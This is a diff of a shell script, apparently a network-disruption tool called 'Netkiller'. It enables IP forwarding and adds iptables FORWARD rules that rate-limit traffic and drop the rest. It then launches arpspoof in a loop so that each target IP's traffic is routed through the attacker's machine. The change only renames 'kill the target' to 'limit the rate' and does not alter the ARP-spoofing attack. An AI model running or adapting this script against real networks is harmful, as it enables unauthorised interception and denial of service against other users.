@@ -23,7 +23,8 @@ fi
 # IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
-iptables -A FORWARD -m hashlimit --hashlimit-name forward_bidirectional --hashlimit-mode srcip,dstip --hashlimit-above 100kb/sec --hashlimit-burst 100kb -j DROP
+iptables -A FORWARD -m limit --limit 1000/s --limit-burst 2000 -j ACCEPT
+iptables -A FORWARD -j DROP
 echo " "
 
 # Functions for clean up
@@ -226,7 +227,7 @@ echo " "
 
 # Start ARP spoofing for each target
 for TARGET in "${TARGETS[@]}"; do
-     echo "Netkiller kill the target IP: $TARGET"
+     echo "Netkiller limit the rate for target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
 done
 echo " "
